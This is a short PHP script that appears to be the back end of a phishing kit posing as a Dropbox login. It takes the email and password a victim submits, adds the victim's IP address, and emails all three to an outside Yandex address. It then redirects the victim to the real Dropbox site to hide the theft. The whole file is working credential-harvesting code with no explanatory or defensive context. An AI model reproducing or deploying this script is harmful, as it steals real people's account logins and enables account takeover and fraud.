<?
$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Wire || :------\n";
$message .= "Email: ".$_POST['formtext1']."\n";
$message .= "Password: ".$_POST['formtext2']."\n";
$message .= "----: || Logs || :------\n";
$message .= "IP: ".$ip."\n";
$recipient ="onlineaccesss@yandex.com";
$subject = "ONGOD | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: https://Dropbox.com");
?>